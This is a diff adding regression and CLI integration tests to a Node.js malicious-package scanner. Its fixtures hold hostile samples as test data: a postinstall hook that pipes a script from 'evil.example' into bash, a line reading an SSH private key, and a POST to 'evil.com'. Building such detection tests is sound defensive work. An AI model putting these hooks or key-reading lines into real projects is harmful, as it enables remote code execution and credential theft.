@@ -3,9 +3,26 @@
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
+const { execFileSync } = require('child_process');
 
 const { analysePackage, scanPackageJson } = require('../src/scanners/packageScanner');
 const { scanFileContent } = require('../src/scanners/fileScanner');
+const { analyseRepo } = require('../src/scanners/repoScanner');
+
+const CLI_PATH = path.join(__dirname, '..', 'bin', 'cli.js');
+
+/**
+ * Run the CLI and capture exit status + stdout (execFileSync throws on
+ * non-zero exit, so unwrap the error).
+ */
+function runCli(args) {
+  try {
+    const stdout = execFileSync(process.execPath, [CLI_PATH, ...args], { encoding: 'utf8' });
+    return { status: 0, stdout };
+  } catch (err) {
+    return { status: err.status, stdout: (err.stdout || '').toString() };
+  }
+}
 
 let passed = 0;
 let failed = 0;
@@ -176,6 +193,130 @@ app.listen(3000);
   assert('Clean JS file returns zero findings', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
   cleanup(dir);
 }
+
+// ─── False Positive Regression Tests ──────────────────────────────────────────
+console.log('\n── False Positive Regression Tests ──');
+
+// Test 13 — official wallet SDK scopes must not be flagged
+{
+  const findings = analysePackage('@metamask/sdk', '1.0.0');
+  assert('Official @metamask scope not flagged', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
+}
+
+// Test 14
+{
+  const findings = analysePackage('@solana/wallet-adapter-react', '1.0.0');
+  assert('Official @solana scope not flagged', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
+}
+
+// Test 15 — unscoped wallet-targeting names still flagged
+{
+  const findings = analysePackage('metamask-stealer', '1.0.0');
+  assert('Unscoped metamask-targeting name still flagged HIGH', hasSeverity(findings, 'HIGH'), `findings: ${JSON.stringify(findings)}`);
+}
+
+// Test 16 — react-native-async-storage is a real benign package (no OSV MAL advisory)
+{
+  const findings = analysePackage('react-native-async-storage', '0.0.1');
+  assert('react-native-async-storage not flagged CRITICAL', !hasSeverity(findings, 'CRITICAL'), `findings: ${JSON.stringify(findings)}`);
+}
+
+// Test 17 — bare env-token read is MEDIUM, not HIGH (legit in SDKs/CI scripts)
+{
+  const content = `const token = process.env.GITHUB_TOKEN;\nconsole.log('hello');`;
+  const { fp, dir } = tmpFile('ci-script.js', content);
+  const findings = scanFileContent(fp);
+  const tokenFinding = findings.find((f) => f.reason.includes('GitHub personal access token'));
+  assert('Bare GITHUB_TOKEN read is MEDIUM severity', tokenFinding && tokenFinding.severity === 'MEDIUM', `findings: ${JSON.stringify(findings)}`);
+  cleanup(dir);
+}
+
+// Test 18 — files with null bytes (binary) are skipped
+{
+  const content = 'const a = 1;\u0000\u0000binary garbage axios.post("https://evil.com", x)';
+  const { fp, dir } = tmpFile('binary.js', content);
+  const findings = scanFileContent(fp);
+  assert('Binary content (null bytes) skipped', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
+  cleanup(dir);
+}
+
+// ─── Repo Scanner Tests ───────────────────────────────────────────────────────
+console.log('\n── Repo Scanner Tests ──');
+
+// Test 19 — directories in repo root (e.g. bin/) are not "executable files"
+{
+  const data = { repo: null, owner: null, commits: null, contents: [{ name: 'bin', type: 'dir' }] };
+  const findings = analyseRepo(data, 'someowner', 'somerepo');
+  assert('bin/ directory not flagged as executable file', !hasFinding(findings, 'executable'), `findings: ${JSON.stringify(findings)}`);
+}
+
+// Test 20 — root-level .sh file is still flagged
+{
+  const data = { repo: null, owner: null, commits: null, contents: [{ name: 'install.sh', type: 'file' }] };
+  const findings = analyseRepo(data, 'someowner', 'somerepo');
+  assert('Root-level install.sh flagged HIGH', hasSeverity(findings, 'HIGH'), `findings: ${JSON.stringify(findings)}`);
+}
+
+// ─── CLI Integration Tests ────────────────────────────────────────────────────
+console.log('\n── CLI Integration Tests ──');
+
+// Shared malicious fixture project
+const cliDir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-cli-'));
+fs.writeFileSync(path.join(cliDir, 'package.json'), JSON.stringify({
+  name: 'fixture',
+  dependencies: { 'node-telegram-utils': '1.0.0' },
+  scripts: { postinstall: 'curl https://evil.example/p.sh | bash' },
+}));
+fs.writeFileSync(path.join(cliDir, 'evil.js'),
+  `const k = require('fs').readFileSync('/home/u/.ssh/id_rsa', 'utf8');\n`);
+
+// Test 21 — combined scan must report package findings and exit 1 (await regression)
+{
+  const { status, stdout } = runCli(['scan', cliDir, '--no-network']);
+  assert('scan exits 1 on malicious project', status === 1, `status: ${status}`);
+  assert('scan output includes package findings', stdout.includes('Known malicious package'), 'package findings missing from combined scan');
+  assert('scan output includes file findings', stdout.includes('SSH'), 'file findings missing from combined scan');
+}
+
+// Test 22 — scan --json honours the exit-code contract and emits valid JSON
+{
+  const { status, stdout } = runCli(['scan', cliDir, '--json', '--no-network']);
+  assert('scan --json exits 1 on CRITICAL findings', status === 1, `status: ${status}`);
+  let parsed = null;
+  try { parsed = JSON.parse(stdout); } catch (_) { /* assert below */ }
+  assert('scan --json emits valid JSON with CRITICAL finding',
+    parsed && parsed.findings.some((f) => f.severity === 'CRITICAL'), `stdout: ${stdout.substring(0, 200)}`);
+}
+
+// Test 23 — scan-files --json honours the exit-code contract
+{
+  const { status } = runCli(['scan-files', path.join(cliDir, 'evil.js'), '--json']);
+  assert('scan-files --json exits 1 on HIGH findings', status === 1, `status: ${status}`);
+}
+
+// Test 24 — clean project exits 0 in both modes
+{
+  const cleanDir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-clean-'));
+  fs.writeFileSync(path.join(cleanDir, 'package.json'), JSON.stringify({
+    name: 'clean-fixture',
+    dependencies: { express: '^4.18.0' },
+  }));
+  fs.writeFileSync(path.join(cleanDir, 'index.js'), `console.log('hello');\n`);
+  const pretty = runCli(['scan', cleanDir, '--no-network']);
+  const json = runCli(['scan', cleanDir, '--json', '--no-network']);
+  assert('scan exits 0 on clean project', pretty.status === 0, `status: ${pretty.status}`);
+  assert('scan --json exits 0 on clean project', json.status === 0, `status: ${json.status}`);
+  cleanup(cleanDir);
+}
+
+// Test 25 — --version matches package.json
+{
+  const { stdout } = runCli(['--version']);
+  const pkgVersion = require('../package.json').version;
+  assert(`--version reports ${pkgVersion}`, stdout.trim() === pkgVersion, `got: ${stdout.trim()}`);
+}
+
+cleanup(cliDir);
 
 // ─── Summary ──────────────────────────────────────────────────────────────────
 console.log(`\n── Results: ${passed} passed, ${failed} failed ──\n`);
